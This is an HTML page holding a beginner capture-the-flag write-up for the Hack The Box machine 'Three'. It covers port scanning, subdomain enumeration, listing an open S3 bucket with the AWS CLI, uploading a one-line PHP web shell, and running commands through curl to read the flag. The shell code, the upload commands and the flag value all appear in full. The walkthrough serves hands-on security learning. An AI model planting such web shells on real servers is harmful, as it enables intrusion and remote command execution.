@@ -1,0 +1,360 @@
+<!doctype html>
+<html lang="en-US">
+  <head>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+
+    <link rel="icon" href="/favicon.ico" type="image/x-icon">
+
+<!-- Begin Jekyll SEO tag v2.8.0 -->
+<title>Hack The Box Three | frncscrlnd’s writeups</title>
+<meta name="generator" content="Jekyll v3.10.0" />
+<meta property="og:title" content="Hack The Box Three" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="Walkthorugh/Writeup for Three, a Starting Point Hack The Box machine about AWS S3 buckets, PHP web shells and directory/subdomain enumeration" />
+<meta property="og:description" content="Walkthorugh/Writeup for Three, a Starting Point Hack The Box machine about AWS S3 buckets, PHP web shells and directory/subdomain enumeration" />
+<link rel="canonical" href="http://localhost:4000/hackthebox/Three" />
+<meta property="og:url" content="http://localhost:4000/hackthebox/Three" />
+<meta property="og:site_name" content="frncscrlnd’s writeups" />
+<meta property="og:type" content="website" />
+<meta name="twitter:card" content="summary" />
+<meta property="twitter:title" content="Hack The Box Three" />
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"WebPage","description":"Walkthorugh/Writeup for Three, a Starting Point Hack The Box machine about AWS S3 buckets, PHP web shells and directory/subdomain enumeration","headline":"Hack The Box Three","url":"http://localhost:4000/hackthebox/Three"}</script>
+<!-- End Jekyll SEO tag -->
+
+    <link rel="stylesheet" href="/assets/css/style.css?v=150d28b77225a4a207f11ff76d8d5a1e96152911">
+    <script src="https://code.jquery.com/jquery-1.12.4.min.js" integrity="sha256-ZosEbRLbNQzLpnKIkEdrPv7lOy9C27hHQ+Xp8a4MxAQ=" crossorigin="anonymous"></script>
+    <script src="/assets/js/respond.js"></script>
+    <!--[if lt IE 9]>
+      <script src="//html5shiv.googlecode.com/svn/trunk/html5.js"></script>
+    <![endif]-->
+    <!--[if lt IE 8]>
+    <link rel="stylesheet" href="/assets/css/ie.css">
+    <![endif]-->
+    <meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no">
+    <!-- start custom head snippets, customize with your own _includes/head-custom.html file -->
+
+<!-- Setup theme-color -->
+<!-- start theme color meta headers -->
+<meta name="theme-color" content="#353535">
+<meta name="msapplication-navbutton-color" content="#353535">
+<meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+<!-- end theme color meta headers -->
+
+
+<!-- Setup Google Analytics -->
+
+
+
+<!-- You can set your favicon here -->
+<!-- link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" -->
+
+<!-- end custom head snippets -->
+
+    <script>
+      MathJax = {
+        tex: {
+          inlineMath: [['$', '$'], ['\\(', '\\)']],
+          displayMath: [['$$', '$$'], ['\\[', '\\]']]
+        },
+        svg: { fontCache: 'global' }
+      };
+    </script>
+    <script id="MathJax-script" async
+            src="https://cdn.jsdelivr.net/npm/mathjax@3/es5/tex-mml-chtml.js">
+    </script>
+  </head>
+  <body>
+    <div class="wrapper">
+      <section>
+        <div id="title">
+          <h1>frncscrlnd's writeups</h1>
+          <p>Writeups from challenges and CTFs i take part in.</p>
+          <hr>
+          <span class="credits left">Project maintained by <a href="https://github.com/frncscrlnd">frncscrlnd</a></span>
+          <span class="credits right">Hosted on GitHub Pages &mdash; Theme by <a href="https://twitter.com/mattgraham">mattgraham</a></span>
+        </div>
+
+        <h1 id="three"><a href="https://app.hackthebox.com/machines/Three">Three</a><!-- omit in toc --></h1>
+
+<p>This Starting Point machine revolves entirely around <a href="https://aws.amazon.com/s3/">AWS S3 buckets</a>, PHP web shells and directory/subdomain enumeration.</p>
+
+<h3 id="table-of-contents">Table of contents:</h3>
+<ul>
+  <li><a href="#task-1">Task 1</a></li>
+  <li><a href="#task-2">Task 2</a></li>
+  <li><a href="#task-3">Task 3</a></li>
+  <li><a href="#task-4">Task 4</a></li>
+  <li><a href="#task-5">Task 5</a></li>
+  <li><a href="#task-6">Task 6</a></li>
+  <li><a href="#task-7">Task 7</a></li>
+  <li><a href="#task-8">Task 8</a></li>
+  <li><a href="#task-9">Task 9</a></li>
+  <li><a href="#submit-flag">Submit Flag</a></li>
+</ul>
+
+<h2 id="task-1">Task 1</h2>
+
+<p><em>How many TCP ports are open?</em></p>
+
+<p>To answer this question we need to run a thorough <a href="https://nmap.org/">nmap</a> scan on all <a href="https://en.wikipedia.org/wiki/Transmission_Control_Protocol">TCP</a> ports like this: <code class="language-plaintext highlighter-rouge">nmap target-ip-here -p- -T 5</code></p>
+
+<p><code class="language-plaintext highlighter-rouge">-p-</code> means that <a href="https://en.wikipedia.org/wiki/List_of_TCP_and_UDP_port_numbers">all 65535 TCP ports</a> are going to be scanned. You can speed up this process with <code class="language-plaintext highlighter-rouge">-T 5</code> which will <a href="https://nmap.org/book/performance-timing-templates.html">scan faster</a>.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Host is up (0.046s latency).
+Not shown: 65533 closed tcp ports (reset)
+PORT   STATE SERVICE
+22/tcp open  ssh
+80/tcp open  http
+</code></pre></div></div>
+
+<p>This means that there are</p>
+
+<blockquote>
+  <p>2</p>
+</blockquote>
+
+<p>open TCP ports on this machine.</p>
+
+<h2 id="task-2">Task 2</h2>
+
+<p><em>What is the domain of the email address provided in the “Contact” section of the website?</em></p>
+
+<p>Let’s paste the machine’s ip in our address bar and head to the <code class="language-plaintext highlighter-rouge">#/contact</code> page. Here we’ll see</p>
+
+<p><img src="/assets/images/htb/three/email.png" alt="email" /></p>
+
+<p>This means that the domain of the email address is</p>
+
+<blockquote>
+  <p>thetoppers.htb</p>
+</blockquote>
+
+<h2 id="task-3">Task 3</h2>
+
+<p><em>In the absence of a DNS server, which Linux file can we use to resolve hostnames to IP addresses in order to be able to access the websites that point to those hostnames?</em></p>
+
+<p>We learned about the</p>
+
+<blockquote>
+  <p><code class="language-plaintext highlighter-rouge">/etc/hosts</code></p>
+</blockquote>
+
+<p>file in the <a href="https://frncscrlnd.github.io/writeups/hackthebox/Responder">Responder</a> machine. This file enables users to use local address resolution by typing the IP address and respective hostname manually. Let’s put <code class="language-plaintext highlighter-rouge">thetoppers.htb</code> in our <code class="language-plaintext highlighter-rouge">hosts</code> file:</p>
+
+<p><code class="language-plaintext highlighter-rouge">sudo nano /etc/hosts</code></p>
+
+<p>then paste</p>
+
+<p><code class="language-plaintext highlighter-rouge">target-ip-here thetoppers.htb</code></p>
+
+<h2 id="task-4">Task 4</h2>
+
+<p><em>Which sub-domain is discovered during further enumeration?</em></p>
+
+<p>Back in the <a href="https://frncscrlnd.github.io/writeups/hackthebox/Appointment">Appointment</a> machine we laearned that <a href="https://github.com/OJ/gobuster">gobuster</a> is a subdomain/directory enumeration tool. We know that <code class="language-plaintext highlighter-rouge">dir</code> is the flag used to specify directory enumeration and, according to the <a href="https://github.com/OJ/gobuster">docs</a>, in order to enumerate subdomains, we need to use</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>gobuster vhost -u http://thetoppers.htb -w /usr/share/wordlists/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt --append-domain
+</code></pre></div></div>
+
+<p><code class="language-plaintext highlighter-rouge">vhost</code> specifies that we are enumerating <a href="https://en.wikipedia.org/wiki/Virtual_hosting">virtual hosts</a> on this machine (<code class="language-plaintext highlighter-rouge">x.thetoppers.htb</code>). This means that multiple websites are running on the same server (and thus on the same IP); different websites will be returned to the user based on the value of the <code class="language-plaintext highlighter-rouge">Host:</code> header, which is what the. <a href="https://github.com/danielmiessler/SecLists"><code class="language-plaintext highlighter-rouge">seclists</code></a> is a well-known collection of wordlists and <a href="https://github.com/OJ/gobuster#:~:text=vhost,-%29"><code class="language-plaintext highlighter-rouge">--append-domain</code></a> specifies that gobuster needs to append <code class="language-plaintext highlighter-rouge">.thetoppers.htb</code> to all requests (e.g. <code class="language-plaintext highlighter-rouge">merch.thetoppers.htb</code>).</p>
+
+<p>Thiw will return</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>s3.thetoppers.htb Status: 404 [Size: 21]
+</code></pre></div></div>
+
+<p>This returns a 404 <a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Reference/Status">HTTP status code</a> (Not Found) because we need to also add this hostname to our <code class="language-plaintext highlighter-rouge">/etc/hosts</code> file with the same IP as <code class="language-plaintext highlighter-rouge">thetoppers.htb</code>. Once we add this hostname (like we did in <a href="#task-3">Task 3</a>), we can visit <code class="language-plaintext highlighter-rouge">s3.thetoppers.htb</code> and it will return</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>{"status": "running"}
+</code></pre></div></div>
+
+<h2 id="task-5">Task 5</h2>
+
+<p><em>Which service is running on the discovered sub-domain?</em></p>
+
+<p>Let’s look <a href="https://docs.aws.amazon.com/Route53/latest/DeveloperGuide/getting-started-s3.html">this</a> up.</p>
+
+<p>It’s an</p>
+
+<blockquote>
+  <p>Amazon S3</p>
+</blockquote>
+
+<p><a href="https://aws.amazon.com/s3/">bucket</a>, a cloud storage service for S3 Objects from <a href="https://docs.aws.amazon.com/">AWS</a>.</p>
+
+<h2 id="task-6">Task 6</h2>
+
+<p><em>Which command line utility can be used to interact with the service running on the discovered sub-domain?</em></p>
+
+<p>We found out from the <a href="https://docs.aws.amazon.com/AmazonS3/latest/userguide/access-bucket-intro.html#accessing-aws-cli">docs</a> that we can interact with S£ via</p>
+
+<blockquote>
+  <p><code class="language-plaintext highlighter-rouge">awscli</code></p>
+</blockquote>
+
+<p>a guide con be found <a href="https://aws.amazon.com/cli/">here</a>. We can install <code class="language-plaintext highlighter-rouge">awscli</code> with <code class="language-plaintext highlighter-rouge">sudo apt install awscli</code></p>
+
+<h2 id="task-7">Task 7</h2>
+
+<p><em>Which command is used to set up the AWS CLI installation?</em></p>
+
+<p>From the same <a href="https://aws.amazon.com/cli/">guide</a> we learn that</p>
+
+<blockquote>
+  <p><code class="language-plaintext highlighter-rouge">aws configure</code></p>
+</blockquote>
+
+<p>is used to set up the AWS CLI installation. Running this will return these prompts:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>AWS Access Key ID [None]: 
+AWS Secret Access Key [None]: 
+Default region name [None]: 
+Default output format [None]: 
+</code></pre></div></div>
+
+<p>we’ll fill all of these with <code class="language-plaintext highlighter-rouge">test</code> (or anything else you want) as we need to fill them for the installation to work.</p>
+
+<h2 id="task-8">Task 8</h2>
+
+<p><em>What is the command used by the above utility to list all of the S3 buckets?</em></p>
+
+<p>Again, from this <a href="https://aws.amazon.com/cli/">guide</a> we learn that, just like in GNU/Linux distributions with <code class="language-plaintext highlighter-rouge">ls</code>, we can list <a href="https://docs.aws.amazon.com/AmazonS3/latest/userguide/GettingStartedS3CLI.html">S3 buckets</a> with</p>
+
+<blockquote>
+  <p><code class="language-plaintext highlighter-rouge">aws s3 ls</code></p>
+</blockquote>
+
+<p>In our case, we need to specify our endpoint with a <code class="language-plaintext highlighter-rouge">--endpoint</code> flag like this:</p>
+
+<p><code class="language-plaintext highlighter-rouge">aws --endpoint=http://s3.thetoppers.htb s3 ls</code></p>
+
+<p>This will return</p>
+
+<p><code class="language-plaintext highlighter-rouge">thetoppers.htb</code></p>
+
+<p>Now we can append the S3 bucket name to our last command and list all objects in that bucket:</p>
+
+<p><code class="language-plaintext highlighter-rouge">aws --endpoint=http://s3.thetoppers.htb s3 ls thetoppers.htb</code></p>
+
+<p>Which will return</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>                           PRE images/
+2026-04-20 14:45:04          0 .htaccess
+2026-04-20 14:45:04      11952 index.php
+</code></pre></div></div>
+
+<h2 id="task-9">Task 9</h2>
+
+<p><em>This server is configured to run files written in what web scripting language?</em></p>
+
+<p>Just like we did while solving the <a href="https://frncscrlnd.github.io/writeups/hackthebox/Responder">Responder</a> machine, we can use <a href="https://nmap.org/">nmap</a> and the <code class="language-plaintext highlighter-rouge">-sV</code> flag to <a href="https://nmap.org/book/man-version-detection.html">detect the service and the respective version running on a port</a> like this: <code class="language-plaintext highlighter-rouge">nmap target-ip-here -sV</code></p>
+
+<p>This will return</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Host is up (0.097s latency).
+Not shown: 992 closed tcp ports (reset)
+PORT      STATE    SERVICE  VERSION
+22/tcp    open     ssh      OpenSSH 7.6p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
+80/tcp    open     http     Apache httpd 2.4.29 ((Ubuntu))
+843/tcp   filtered unknown
+1334/tcp  filtered writesrv
+1812/tcp  filtered radius
+2393/tcp  filtered ms-olap1
+6689/tcp  filtered tsa
+52673/tcp filtered unknown
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 9.90 seconds
+</code></pre></div></div>
+
+<p>This means that the web server runs files written in the</p>
+
+<blockquote>
+  <p>PHP</p>
+</blockquote>
+
+<p>programming language.</p>
+
+<p>This also means that we can upload a PHP web shell inside the bucket. We’ll use a PHP shell from [https://www.revshells.com/]:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;?php if(isset($_REQUEST["cmd"])){ echo "&lt;pre&gt;"; $cmd = ($_REQUEST["cmd"]); system($cmd); echo "&lt;/pre&gt;"; die; }?&gt;
+</code></pre></div></div>
+
+<p>Let’s create a <code class="language-plaintext highlighter-rouge">shell.php</code> file on our machine: <code class="language-plaintext highlighter-rouge">nano shell.php</code>, then we’ll copy it to the bucket with <code class="language-plaintext highlighter-rouge">cp</code>.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>aws --endpoint=http://s3.thetoppers.htb s3 cp shell.php s3://thetoppers.htb
+</code></pre></div></div>
+
+<p>This will return</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>upload: ./shell.php to s3://thetoppers.htb/shell.php 
+</code></pre></div></div>
+
+<p>To make sure we uploaded the PHP file, we can run</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>aws --endpoint=http://s3.thetoppers.htb s3 ls thetoppers.htb
+</code></pre></div></div>
+
+<p>again.</p>
+
+<p>We can make sure this works by useing <code class="language-plaintext highlighter-rouge">curl</code>:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>curl "http://thetoppers.htb/shell.php?cmd=ls"
+</code></pre></div></div>
+
+<p>If this returns</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;pre&gt;images
+index.php
+shell.php
+&lt;/pre&gt;            
+</code></pre></div></div>
+
+<p>That means it worked.</p>
+
+<h2 id="submit-flag">Submit Flag</h2>
+
+<p><em>Submit root flag</em></p>
+
+<p>As we saw from <a href="#task-9">Task 9</a>, nothing of value is in this directory. Let’s see which directory we’re in with</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>curl "http://thetoppers.htb/shell.php?cmd=pwd"
+</code></pre></div></div>
+
+<p>This will return</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;pre&gt;/var/www/html
+&lt;/pre&gt; 
+</code></pre></div></div>
+
+<p>Let’s see where the flag might be by looking inside the parent directory (we can chain a multiple commands/parameters with <code class="language-plaintext highlighter-rouge">+</code>):</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>curl "http://thetoppers.htb/shell.php?cmd=ls+.."
+</code></pre></div></div>
+
+<p>This will return</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;pre&gt;flag.txt
+html
+&lt;/pre&gt;
+</code></pre></div></div>
+<p>Let’s then read the flag with</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>curl "http://thetoppers.htb/shell.php?cmd=cat+../flag.txt"
+</code></pre></div></div>
+
+<p>This will return</p>
+
+<blockquote>
+  <p><code class="language-plaintext highlighter-rouge">a980d99281a28d638ac68b9bf9453c2b</code></p>
+</blockquote>
+
+
+      </section>
+
+    </div>
+  </body>
+</html>
